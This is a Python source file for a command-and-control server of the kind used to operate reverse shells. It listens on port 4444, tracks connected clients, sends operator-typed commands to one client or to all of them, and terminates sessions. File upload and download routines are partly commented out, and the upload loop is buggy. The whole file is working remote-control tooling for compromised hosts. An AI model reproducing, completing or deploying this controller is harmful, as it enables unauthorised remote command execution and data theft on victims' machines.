import socket
import threading
import os

# dic to store connected clients
clients = {

}

def handle_client(conn, addr):
    try:
        print("[+] Connection established from:", addr)
        clients[addr] = conn

        while True:
            command = conn.recv(1024).decode()
            # part_1,part_2 = command.split("|")
            # part_1 = part_1.decode()
            print(f"\ncommand is : {command}\n")
            if command == "exit":
                conn.close()
                del clients[addr]
                print("[+] Connection closed from:", addr)
                break
            # if command.startswith("DOWNLOAD"):
            #     _, file_path, dest_path = command.split()
            #     download_file(conn, file_path, dest_path)
            # if part_2.startswith("UPLOAD"):
            #     print(f"^^^command is {command}\n")
            #     # part_1,part_2 = command.split("|")
            #     _, file_path, dest_path = part_2.split()
            #     print("we are in the first elif\n")
            #     upload_file(conn, file_path, dest_path,part_1)
            else:
                # print("we are in the else\n")
                print("\n")
                print("----------------")
                print(f"Command received from {addr}:\n{command}")
                print("----------------")
    except ConnectionResetError:
        # Handle client disconnect
        conn.close()
        del clients[addr]
        print("[+] Connection closed unexpectedly from:", addr)
    except Exception as e:
        print("[-] An error occurred while handling client:", e)

def download_file(conn, file_path, dest_path):
    try:
        with open(file_path, "rb") as f:
            while True:
                bytes_read = f.read(100)
                if not bytes_read:
                    break
                conn.sendall(bytes_read)
            conn.sendall(b"DONE")
        print(f"[+] File '{file_path}' sent to client")
    except FileNotFoundError:
        print(f"[-] File '{file_path}' not found")
        conn.send(b"File not found")
    except Exception as e:
        print(f"[-] Error occurred while sending file: {e}")
        conn.send(b"Error occurred while sending file")

def upload_file(conn, file_path, dest_path,part_2):
    try:
        print("we are in the outer upload\n")
        with open(dest_path, "wb") as f:
            while True:
                data = part_2
                if data == b"DONE":
                    break
                print("we are in the upload file\n")
                f.write(data)
        print(f"[+] File '{file_path}' received and saved as '{dest_path}'")
        conn.send(b"File received successfully")
    except Exception as e:
        print(f"[-] Error occurred while receiving file: {e}")
        conn.send(b"Error occurred while receiving file")

def send_commands_to_client(client_conn, client_addr):
    while True:
        command = input("Enter command ('comeback' to menu): ")
        print("\n")
        if command.lower() == "comeback":
            print("Returning to the main menu...")
            return
        if command.lower() == "exit":
            print("returnting ..\n")
            return
        #-------------------
        # if command.startswith("DOWNLOAD"):
        #         print("^^^^^^^^^^^^^^wee are in the dwonload field")
        #         client_conn.send(command.encode())
        #         _, file_path, dest_path = command.split()
        #         download_file(client_conn, file_path, dest_path)
        
        # if command.startswith("UPLOAD"):
        #         print("^^^^^^^^^^^^^^wee are in the upload field")
        #         client_conn.send(command.encode())

        #         _, file_path, dest_path = command.split()
        #         print("we are in the first elif\n")
        #         upload_file(client_conn, file_path, dest_path)
        #-------------------
        else:
            client_conn.send(command.encode())
            print("[+] Command sent to", client_addr)

def send_command_to_client():
    print("\n[+] Connected clients:")
    for i, addr in enumerate(clients.keys()):
        print(f"{i+1}. {addr}")

    try:
        choice = int(input("Enter client number( 0 to menu): "))
        if choice == 0:
            return
        elif choice <= len(clients):
            selected_addr = list(clients.keys())[choice - 1]
            selected_conn = clients[selected_addr]
            send_commands_to_client(selected_conn, selected_addr)
            return selected_addr
        else:
            print("Invalid choice. Please try again.")
            return send_command_to_client()
    except ValueError:
        print("Invalid input. Please enter a number.")
        return send_command_to_client()

def send_command_to_all():
    while True:
        command = input(" all clients ('comeback' to menu): ")
        print("\n")
        if command.lower() == "comeback":
            print("Returning to the main menu...")
            return
        else:
            for addr, conn in clients.items():
                conn.send(command.encode())
                print("[+] Command sent to", addr)

def kill_connection():
    print("\n[+] Connected clients:")
    for i, addr in enumerate(clients.keys()):
        print(f"{i+1}. {addr}")

    try:
        choice = int(input("Enter client number to disconnect( 0 to menu): "))
        if choice == 0:
            return
        elif choice <= len(clients):
            selected_addr = list(clients.keys())[choice - 1]
            selected_conn = clients[selected_addr]
            selected_conn.send(b"exit")
            selected_conn.close()
            del clients[selected_addr]
            print("[+] Connection closed from", selected_addr)
        else:
            print("invalid  :  Please try again.")
            return kill_connection()
    except ValueError:
        print("invalid :  Please enter a number.")
        return kill_connection()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4444))
    s.listen(5) #it will quue 5 connections and the 6th it throws out one of them and then adds the 6th one...
    print("[+] Listening for incoming connections...")

    # try:
    while True:
        
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

        while True:
        
            print("\n[+] Main Menu:")
            print("1. Send command to client")
            print("2. Send command to all clients")
            print("3. Kill connection with a client")
            print("4. Exit")
            choice = input("Enter your choice: ")

            if choice == "1":
                selected_client = send_command_to_client()
                if selected_client:
                    continue  
                else:
                    break
            elif choice == "2":
                send_command_to_all()
            elif choice == "3":
                kill_connection()
            elif choice == "4":
            
                # Close all client connections before exiting
                for conn in clients.values():
                    conn.send(b"exit")
                    conn.close()
                s.close()
                print("Exiting...")
                return
            else:
                print("Invalid choice. Please try again.")
    # except KeyboardInterrupt:
    #     # Handle Ctrl+C for graceful shutdown
    #     print("Shutting down the server...")
    #     s.close()
    #     for conn in clients.values():
    #         conn.send(b"exit")
    #         conn.close()

if __name__ == "__main__":
    main()